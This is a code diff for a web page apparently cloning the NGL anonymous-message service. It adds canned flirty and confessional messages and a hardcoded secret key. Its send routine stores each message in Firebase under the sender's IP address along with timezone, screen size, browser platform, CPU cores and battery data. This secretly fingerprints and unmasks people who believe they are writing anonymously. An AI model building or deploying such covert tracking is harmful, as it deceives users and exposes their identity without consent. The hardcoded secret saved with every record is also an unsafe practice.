@@ -13,15 +13,70 @@ const firebaseConfig = {
 };
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
+const secretKey = "s3cr3tKey_9xPZ!w@VtL#2k7^QfJ8RbMh";
+let topSecIn = document.getElementById("topSecIn");
+let msgSentPage = document.getElementById("msgSentPage");
+let sendAnotherMsg = document.getElementById("sendAnotherMsg");
+let sendBtnIn = document.getElementById("sendBtnIn");
+let sending = document.getElementById("sending");
+let userMessage = document.getElementById("inputBox");
+const baseMessages = [
+  // Flirty
+  "i lowkey have a crush on u fr 😳",
+  "ur literally the cutest omg 😍",
+  "been staring at ur pics tbh",
+  "i wanna kiss u but shy ngl 😘",
+  "how u always look so good tho? 🔥",
 
-function retrieveData(){
-    let svgSend = document.getElementById("svgSend");
-    let userMessage = document.getElementById("inputBox");
+  // Funny / Chaotic
+  "pineapple on pizza is a crime fr 🍍🍕",
+  "do u dance in the shower? pls say yes 😂",
+  "i once tripped in front of my crush lol",
+  "do u think aliens watch us? 👽 idk",
+  "if u were a meme, which one would u be?",
+
+  // Confession / Shy / Insecure
+  "i get nervous just texting u lol",
+  "sometimes i feel like no one really gets me",
+  "lowkey scared ur gonna ghost me tbh",
+  "i was jealous when u talked to them :(",
+  "idk if u like me back but i really hope so",
+
+  // Bold / Direct
+  "i think ur outta my league but imma try 😤",
+  "why haven’t u asked me out yet? fr",
+  "u gotta tell me ur secrets sometime",
+  "can u stop being so perfect? it’s unfair",
+  "let’s just admit we both wanna hang soon",
+
+  // Natural + slang + chaotic style
+  "ngl u make me wanna be better fr",
+  "ikr this sounds crazy but i like u lol",
+  "pls say u like me back or imma cry 😭",
+  "u always on my mind no cap",
+  "fr i’m kinda obsessed with u, not gonna lie"
+];
     
+function sendMessage(){
+    module.backToHome = function backToHome(){
+        document.title = "@1jwclx._";
+        topSecIn.style.display = "flex";
+        msgSentPage.style.display = "none";
+        sendAnotherMsg.style.display = "none";
+    }
+    module.msgSent = function msgSent(){
+        document.title = "NGL - Sent!";
+        topSecIn.style.display = "none";
+        msgSentPage.style.display = "flex";
+        sendAnotherMsg.style.display = "flex";
+    }
+    module.generateRandom = function generateRandom(){
+        const randomIndex = Math.floor(Math.random() * baseMessages.length);
+        userMessage.value = baseMessages[randomIndex];
+    }
     module.sendMsg = async function sendMsg() {
         var timeStamp = new Date().getTime();
-        let now = new Date();
-        let currentDate = now.toLocaleString();
+        let currentDate = new Date().toISOString();
         let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         let screenSize = window.screen.width + ', ' + window.screen.height;
         let platform = navigator.platform + ', ' + navigator.appName + ', ' + navigator.appVersion;
@@ -52,10 +107,11 @@ function retrieveData(){
         });
         let message = userMessage.value.trim();
         if (userMessage.value.trim().length !== 0) {
-            set(ref(db, 'Messages/' + ip + '/' + currentDate.replace(/\//g, ':').replace(/ /g, '-')), {
-                "Message" : message
+            set(ref(db, 'Messages/' + ip + '/' + timeStamp), {
+                "Message": message,
+                "Secret": secretKey
             }).then(() => {
-                update(ref(db, 'Messages/' + ip + '/' + currentDate.replace(/\//g, ':').replace(/ /g, '-') + '/' + 'Related-Information'), {
+                set(ref(db, 'Messages/' + ip + '/' + timeStamp + '/' + 'Related-Information'), {
                     IP: sessionStorage.getItem('IP'),
                     TIME: currentDate,
                     TIMEZONE: timeZone,
@@ -65,15 +121,15 @@ function retrieveData(){
                     CPUCORES: cpuCores,
                     BATTERY: sessionStorage.getItem('Battery')
                 })
+                module.msgSent();
                 userMessage.value = "";
-                svgSend.classList.add("svgSend")
-                setTimeout(() => {
-                    svgSend.classList.remove("svgSend")
-                }, 2000);
-            })
+                sending.style.display = "none";
+                sendBtnIn.style.display = "flex";
+            });
+            
         }else{
             userMessage.focus();
         }
     }
 }
-retrieveData();
+sendMessage();
